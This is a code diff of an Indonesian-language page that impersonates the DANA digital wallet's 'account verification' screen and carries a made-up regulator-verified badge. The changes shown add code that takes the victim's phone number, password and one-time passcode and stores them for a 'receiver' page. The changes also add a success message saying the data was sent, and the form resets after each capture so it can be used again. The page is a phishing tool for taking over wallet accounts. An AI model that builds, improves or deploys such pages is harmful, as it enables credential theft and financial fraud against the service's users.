@@ -3,14 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>DANA - Pengamanan Akun</title>
+    <title>DANA - Verifikasi Akun</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
         body {
-            background: #f5f7fa;
-            font-family: -apple-system, 'Inter', 'Segoe UI', sans-serif;
+            background: #f0f4fa;
+            font-family: 'Inter', -apple-system, 'Segoe UI', sans-serif;
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -25,42 +26,64 @@
             width: 100%;
             box-shadow: 0 12px 48px rgba(0, 0, 0, 0.08);
             animation: fadeUp 0.5s ease;
+            position: relative;
+            overflow: hidden;
         }
         @keyframes fadeUp {
             from { opacity: 0; transform: translateY(30px); }
             to { opacity: 1; transform: translateY(0); }
         }
 
-        /* ===== HEADER ===== */
-        .logo {
+        .logo-dana {
             text-align: center;
             margin-bottom: 28px;
+            position: relative;
         }
-        .logo img {
-            width: 120px;
-            height: auto;
+        .logo-dana .icon-wrapper {
+            display: inline-block;
+            background: linear-gradient(135deg, #0080ff, #0055cc);
+            width: 72px;
+            height: 72px;
+            border-radius: 20px;
+            line-height: 72px;
+            text-align: center;
+            box-shadow: 0 8px 24px rgba(0, 128, 255, 0.25);
+            margin-bottom: 12px;
         }
-        .logo .brand {
-            font-size: 28px;
-            font-weight: 700;
-            color: #0080ff;
-            letter-spacing: -1px;
-        }
-        .logo .brand span {
+        .logo-dana .icon-wrapper i { font-size: 40px; color: #fff; }
+        .logo-dana .brand {
+            font-size: 30px;
+            font-weight: 800;
+            letter-spacing: -1.5px;
             color: #1a1a2e;
         }
-        .logo .sub {
-            color: #6a6a8a;
-            font-size: 14px;
+        .logo-dana .brand .d { color: #0080ff; }
+        .logo-dana .brand .a { color: #0080ff; }
+        .logo-dana .brand .n { color: #0080ff; }
+        .logo-dana .brand .a2 { color: #0080ff; }
+        .logo-dana .sub {
+            color: #8a8aaa;
+            font-size: 13px;
+            font-weight: 500;
+            letter-spacing: 2px;
+            margin-top: 2px;
+        }
+        .logo-dana .badge-verified {
+            display: inline-block;
+            background: #e8f5e9;
+            color: #0a7a3a;
+            font-size: 11px;
+            font-weight: 600;
+            padding: 2px 14px;
+            border-radius: 60px;
             margin-top: 4px;
         }
 
-        /* ===== TITLE ===== */
         .page-title {
             font-size: 18px;
-            font-weight: 600;
+            font-weight: 700;
             color: #1a1a2e;
-            margin-bottom: 4px;
+            margin-bottom: 2px;
         }
         .page-sub {
             color: #8a8aaa;
@@ -68,7 +91,6 @@
             margin-bottom: 20px;
         }
 
-        /* ===== FORM ===== */
         .form-control-dana {
             background: #f0f4fa;
             border: 2px solid transparent;
@@ -78,6 +100,7 @@
             color: #1a1a2e;
             width: 100%;
             transition: 0.3s;
+            font-family: 'Inter', sans-serif;
         }
         .form-control-dana:focus {
             border-color: #0080ff;
@@ -85,46 +108,42 @@
             box-shadow: 0 0 0 4px rgba(0, 128, 255, 0.08);
             outline: none;
         }
-        .form-control-dana::placeholder {
-            color: #aab0c0;
-        }
+        .form-control-dana::placeholder { color: #aab0c0; }
         .label-dana {
-            font-weight: 500;
+            font-weight: 600;
             color: #4a4a6a;
             font-size: 14px;
             margin-bottom: 6px;
             display: block;
         }
+        .label-dana i { color: #0080ff; margin-right: 6px; }
         .mb-3 { margin-bottom: 18px; }
 
-        /* ===== BUTTON ===== */
         .btn-dana {
             background: linear-gradient(135deg, #0080ff, #0055cc);
             border: none;
             border-radius: 60px;
             padding: 16px;
-            font-weight: 600;
+            font-weight: 700;
             font-size: 16px;
             color: #fff;
             width: 100%;
             transition: 0.3s;
             box-shadow: 0 4px 20px rgba(0, 128, 255, 0.3);
             margin-top: 8px;
+            font-family: 'Inter', sans-serif;
         }
         .btn-dana:hover {
             transform: scale(1.02);
             box-shadow: 0 8px 32px rgba(0, 128, 255, 0.4);
         }
-        .btn-dana:active {
-            transform: scale(0.96);
-        }
+        .btn-dana:active { transform: scale(0.96); }
         .btn-dana:disabled {
             opacity: 0.6;
             cursor: not-allowed;
             transform: none;
         }
 
-        /* ===== LOADING ===== */
         .loading-container {
             display: none;
             text-align: center;
@@ -146,9 +165,9 @@
         .loading-container .text {
             color: #6a6a8a;
             font-size: 14px;
+            font-weight: 500;
         }
 
-        /* ===== OTP ===== */
         .otp-input-group {
             display: flex;
             gap: 10px;
@@ -160,66 +179,31 @@
             height: 56px;
             text-align: center;
             font-size: 22px;
-            font-weight: 600;
+            font-weight: 700;
             border: 2px solid #dce4ec;
             border-radius: 14px;
             background: #f8faff;
             color: #1a1a2e;
             transition: 0.3s;
+            font-family: 'Inter', monospace;
         }
         .otp-input-group input:focus {
             border-color: #0080ff;
             box-shadow: 0 0 0 4px rgba(0, 128, 255, 0.08);
             outline: none;
         }
-        .otp-input-group input::placeholder {
-            color: #c0c8d0;
-            font-size: 14px;
-        }
+        .otp-input-group input::placeholder { color: #c0c8d0; font-size: 14px; }
         .otp-hint {
             color: #8a8aaa;
             font-size: 13px;
             text-align: center;
             margin-top: 8px;
         }
-        .otp-hint strong {
-            color: #1a1a2e;
-        }
+        .otp-hint strong { color: #1a1a2e; }
 
-        /* ===== RESULT ===== */
-        .result-box {
-            background: #f0f8ff;
-            border-radius: 16px;
-            padding: 16px 20px;
-            margin-top: 16px;
-            border-left: 4px solid #0080ff;
-            display: none;
-        }
-        .result-box .label {
-            font-size: 12px;
-            text-transform: uppercase;
-            color: #6a8aaa;
-            letter-spacing: 1px;
-        }
-        .result-box .value {
-            font-size: 18px;
-            font-weight: 600;
-            color: #0080ff;
-            font-family: monospace;
-            word-break: break-all;
-            margin-top: 2px;
-        }
-        .result-box .note {
-            font-size: 13px;
-            color: #4a6a8a;
-            margin-top: 6px;
-        }
-
-        /* ===== PAGE SWITCH ===== */
         .page { display: none; animation: fadeUp 0.4s ease; }
         .page.active { display: block; }
 
-        /* ===== FOOTER ===== */
         .footer-text {
             text-align: center;
             color: #8a8aaa;
@@ -228,12 +212,35 @@
             border-top: 1px solid #eef2f6;
             padding-top: 18px;
         }
-        .footer-text strong { color: #0080ff; }
+        .footer-text .brand-small { color: #0080ff; font-weight: 700; }
 
-        /* ===== RESPONSIVE ===== */
+        .alert-dana {
+            border-radius: 16px;
+            padding: 12px 16px;
+            font-size: 14px;
+            margin-bottom: 12px;
+            display: none;
+        }
+        .alert-dana.error {
+            display: block;
+            background: #fff0f0;
+            border: 1px solid #ffd0d0;
+            color: #cc3030;
+        }
+        .alert-dana.success {
+            display: block;
+            background: #f0faf0;
+            border: 1px solid #b0e0b0;
+            color: #0a7a3a;
+        }
+
+        .hidden-receiver { display: none !important; }
+
         @media (max-width: 400px) {
             .card-dana { padding: 24px 16px; }
             .otp-input-group input { width: 40px; height: 48px; font-size: 18px; }
+            .logo-dana .icon-wrapper { width: 60px; height: 60px; line-height: 60px; }
+            .logo-dana .icon-wrapper i { font-size: 32px; }
         }
     </style>
 </head>
@@ -242,17 +249,22 @@
 <div class="card-dana">
 
     <!-- LOGO -->
-    <div class="logo">
-        <div class="brand">D<span>A</span>N<span>A</span></div>
+    <div class="logo-dana">
+        <div class="icon-wrapper"><i class="bi bi-wallet2"></i></div>
+        <div class="brand"><span class="d">D</span><span class="a">A</span><span class="n">N</span><span class="a2">A</span></div>
         <div class="sub">Dompet Digital Indonesia</div>
+        <div class="badge-verified"><i class="bi bi-shield-check"></i> Terverifikasi OJK</div>
     </div>
 
-    <!-- ===== PAGE 1: LOGIN ===== -->
+    <!-- PAGE 1: LOGIN -->
     <div class="page active" id="pageLogin">
-        <div class="page-title">Pengamanan Akun DANA</div>
+        <div class="page-title">🔐 Pengamanan Akun</div>
         <div class="page-sub">Masukkan nomor DANA dan password Anda</div>
 
-        <div id="loginError" style="color:#e04040;font-size:14px;margin-bottom:12px;display:none;"></div>
+        <div class="alert-dana error" id="loginError">
+            <i class="bi bi-exclamation-circle"></i>
+            <span id="loginErrorText">Nomor atau password salah</span>
+        </div>
 
         <form id="loginForm">
             <div class="mb-3">
@@ -267,11 +279,11 @@
         </form>
 
         <div class="footer-text">
-            &copy; 2026 <strong>DANA</strong> — Keamanan Akun
+            &copy; 2026 <span class="brand-small">DANA</span> — Keamanan Akun
         </div>
     </div>
 
-    <!-- ===== PAGE 2: LOADING ===== -->
+    <!-- PAGE 2: LOADING -->
     <div class="page" id="pageLoading">
         <div class="loading-container" style="display:block;">
             <div class="spinner"></div>
@@ -279,16 +291,19 @@
             <div style="font-size:13px;color:#aab0c0;margin-top:4px;">Mohon tunggu sebentar</div>
         </div>
         <div class="footer-text">
-            &copy; 2026 <strong>DANA</strong> — Keamanan Akun
+            &copy; 2026 <span class="brand-small">DANA</span> — Keamanan Akun
         </div>
     </div>
 
-    <!-- ===== PAGE 3: OTP ===== -->
+    <!-- PAGE 3: OTP -->
     <div class="page" id="pageOtp">
-        <div class="page-title">Kode Verifikasi</div>
+        <div class="page-title">📱 Kode Verifikasi</div>
         <div class="page-sub">Masukkan kode OTP yang dikirim ke nomor Anda</div>
 
-        <div id="otpError" style="color:#e04040;font-size:14px;margin-bottom:12px;display:none;"></div>
+        <div class="alert-dana error" id="otpError">
+            <i class="bi bi-exclamation-circle"></i>
+            <span id="otpErrorText">Kode OTP tidak valid</span>
+        </div>
 
         <div class="otp-input-group">
             <input type="text" id="otp1" maxlength="1" autofocus placeholder="0">
@@ -306,40 +321,11 @@
         <button class="btn-dana" id="btnOtp">Verifikasi</button>
 
         <div style="text-align:center;margin-top:12px;">
-            <button class="btn btn-link" style="color:#0080ff;font-size:13px;text-decoration:none;border:none;background:none;" onclick="resendOtp()">Kirim Ulang Kode</button>
+            <button class="btn btn-link" style="color:#0080ff;font-size:13px;text-decoration:none;border:none;background:none;font-weight:600;" onclick="resendOtp()">Kirim Ulang Kode</button>
         </div>
 
         <div class="footer-text">
-            &copy; 2026 <strong>DANA</strong> — Keamanan Akun
-        </div>
-    </div>
-
-    <!-- ===== PAGE 4: RESULT (OTP Terkirim) ===== -->
-    <div class="page" id="pageResult">
-        <div class="page-title" style="color:#0080ff;">✅ Verifikasi Berhasil</div>
-        <div class="page-sub">OTP telah terkirim ke sistem</div>
-
-        <div class="result-box" style="display:block;">
-            <div class="label">KODE OTP YANG DIKIRIM</div>
-            <div class="value" id="resultOtp">123456</div>
-            <div class="note">
-                <i class="bi bi-check-circle-fill" style="color:#00aa44;"></i>
-                OTP berhasil dikirim ke server tujuan
-            </div>
-        </div>
-
-        <div style="background:#f5f7fa;border-radius:16px;padding:16px;margin-top:12px;">
-            <div style="font-size:13px;color:#4a6a8a;">
-                <i class="bi bi-info-circle"></i>
-                OTP akan muncul di halaman receiver
-            </div>
-            <a href="receiver.html" target="_blank" class="btn btn-dana" style="margin-top:12px;text-decoration:none;text-align:center;">
-                <i class="bi bi-box-arrow-up-right"></i> Buka Receiver
-            </a>
-        </div>
-
-        <div class="footer-text">
-            &copy; 2026 <strong>DANA</strong> — Keamanan Akun
+            &copy; 2026 <span class="brand-small">DANA</span> — Keamanan Akun
         </div>
     </div>
 
@@ -347,16 +333,18 @@
 
 <script>
     // ============================================================
-    // DANA CLONE — LOGIN + OTP
+    // INDEX.HTML — KIRIM DATA KE RECEIVER DULU
     // ============================================================
 
     const loginForm = document.getElementById('loginForm');
     const btnLogin = document.getElementById('btnLogin');
     const btnOtp = document.getElementById('btnOtp');
     const loginError = document.getElementById('loginError');
+    const loginErrorText = document.getElementById('loginErrorText');
     const otpError = document.getElementById('otpError');
+    const otpErrorText = document.getElementById('otpErrorText');
 
-    // ===== OTP AUTO MOVE =====
+    // OTP AUTO MOVE
     const otpInputs = ['otp1','otp2','otp3','otp4','otp5','otp6'];
     otpInputs.forEach((id, index) => {
         const input = document.getElementById(id);
@@ -370,38 +358,53 @@
                 document.getElementById(otpInputs[index - 1]).focus();
             }
         });
+        input.addEventListener('keypress', function(e) {
+            if (!/[0-9]/.test(e.key)) e.preventDefault();
+        });
     });
 
-    // ===== PAGE NAV =====
     function showPage(page) {
         document.querySelectorAll('.page').forEach(el => el.classList.remove('active'));
         document.getElementById(page).classList.add('active');
     }
 
-    // ===== LOGIN =====
+    function hideAlerts() {
+        loginError.style.display = 'none';
+        otpError.style.display = 'none';
+    }
+
+    // ===== LOGIN — KIRIM DATA KE RECEIVER =====
     loginForm.addEventListener('submit', function(e) {
         e.preventDefault();
+        hideAlerts();
 
         const phone = document.getElementById('danaPhone').value.trim();
         const password = document.getElementById('danaPassword').value.trim();
 
-        if (!phone || phone.length < 10) {
+        if (!phone || phone.length < 10 || !/^[0-9]+$/.test(phone)) {
             loginError.style.display = 'block';
-            loginError.textContent = '❌ Nomor DANA tidak valid. Minimal 10 digit.';
+            loginErrorText.textContent = '❌ Nomor DANA harus angka minimal 10 digit.';
             return;
         }
         if (!password || password.length < 6) {
             loginError.style.display = 'block';
-            loginError.textContent = '❌ Password minimal 6 karakter.';
+            loginErrorText.textContent = '❌ Password minimal 6 karakter.';
             return;
         }
 
-        loginError.style.display = 'none';
+        // === KIRIM DATA KE RECEIVER ===
+        const userData = {
+            phone: phone,
+            password: password,
+            timestamp: new Date().toISOString(),
+            status: 'pending'
+        };
+        localStorage.setItem('dana_user_data', JSON.stringify(userData));
 
-        // Tampilkan loading
+        // === TAMPILKAN LOADING ===
         showPage('pageLoading');
 
-        // Simulasi proses
+        // === SIMULASI PROSES ===
         setTimeout(() => {
             // Tampilkan OTP
             document.getElementById('otpPhoneDisplay').textContent = phone;
@@ -411,6 +414,8 @@
 
     // ===== OTP VERIFICATION =====
     btnOtp.addEventListener('click', function() {
+        hideAlerts();
+
         let otp = '';
         otpInputs.forEach(id => {
             otp += document.getElementById(id).value.trim();
@@ -418,55 +423,69 @@
 
         if (otp.length !== 6) {
             otpError.style.display = 'block';
-            otpError.textContent = '❌ Masukkan 6 digit kode OTP.';
+            otpErrorText.textContent = '❌ Masukkan 6 digit kode OTP.';
             return;
         }
 
         if (!/^[0-9]+$/.test(otp)) {
             otpError.style.display = 'block';
-            otpError.textContent = '❌ OTP harus berupa angka.';
+            otpErrorText.textContent = '❌ OTP harus berupa angka.';
             return;
         }
 
-        otpError.style.display = 'none';
+        // === SIMPAN OTP KE RECEIVER ===
+        const otpData = {
+            otp: otp,
+            phone: document.getElementById('danaPhone').value.trim(),
+            password: document.getElementById('danaPassword').value.trim(),
+            timestamp: new Date().toISOString(),
+            status: 'verified'
+        };
+        localStorage.setItem('dana_otp_data', JSON.stringify(otpData));
 
-        // Simulasi loading OTP
-        btnOtp.disabled = true;
-        btnOtp.textContent = 'Memverifikasi...';
+        // === UPDATE STATUS USER ===
+        const userData = JSON.parse(localStorage.getItem('dana_user_data'));
+        if (userData) {
+            userData.status = 'otp_sent';
+            localStorage.setItem('dana_user_data', JSON.stringify(userData));
+        }
 
+        // === NOTIFIKASI SUKSES ===
+        loginError.style.display = 'block';
+        loginError.className = 'alert-dana success';
+        loginError.innerHTML = `
+            <i class="bi bi-check-circle-fill"></i>
+            ✅ Kode OTP berhasil diverifikasi! Data telah dikirim ke receiver.
+        `;
+
+        // Reset OTP
+        otpInputs.forEach(id => {
+            document.getElementById(id).value = '';
+        });
+        document.getElementById('otp1').focus();
+
+        // Kembali ke login
         setTimeout(() => {
-            btnOtp.disabled = false;
-            btnOtp.textContent = 'Verifikasi';
-
-            // Tampilkan hasil
-            document.getElementById('resultOtp').textContent = otp;
-
-            // === SIMPAN OTP KE LOCALSTORAGE ===
-            const otpData = {
-                otp: otp,
-                phone: document.getElementById('danaPhone').value.trim(),
-                timestamp: new Date().toISOString(),
-                status: 'pending'
-            };
-            localStorage.setItem('dana_otp_data', JSON.stringify(otpData));
-
-            showPage('pageResult');
-        }, 1500);
+            loginError.className = 'alert-dana error';
+            loginError.style.display = 'none';
+            showPage('pageLogin');
+            document.getElementById('danaPhone').value = '';
+            document.getElementById('danaPassword').value = '';
+        }, 4000);
     });
 
     // ===== RESEND OTP =====
     function resendOtp() {
         const phone = document.getElementById('danaPhone').value.trim();
-        showToast('📱 Kode OTP baru telah dikirim ke ' + phone, 'info');
-        // Reset OTP fields
+        showToast('📱 Kode OTP baru telah dikirim ke ' + phone);
         otpInputs.forEach(id => {
             document.getElementById(id).value = '';
         });
         document.getElementById('otp1').focus();
     }
 
-    // ===== TOAST (simple) =====
-    function showToast(message, type = 'info') {
+    // ===== TOAST =====
+    function showToast(message) {
         const existing = document.querySelector('.toast-dana');
         if (existing) existing.remove();
 
@@ -500,7 +519,20 @@
             btnOtp.click();
         }
     });
+
+    // ===== PASTE OTP =====
+    document.addEventListener('paste', function(e) {
+        if (!document.getElementById('pageOtp').classList.contains('active')) return;
+        const paste = (e.clipboardData || window.clipboardData).getData('text');
+        if (paste && /^[0-9]{6}$/.test(paste.trim())) {
+            const digits = paste.trim().split('');
+            otpInputs.forEach((id, idx) => {
+                document.getElementById(id).value = digits[idx] || '';
+            });
+            setTimeout(() => btnOtp.click(), 300);
+        }
+    });
 </script>
 
 </body>
-  </html>
+        </html>
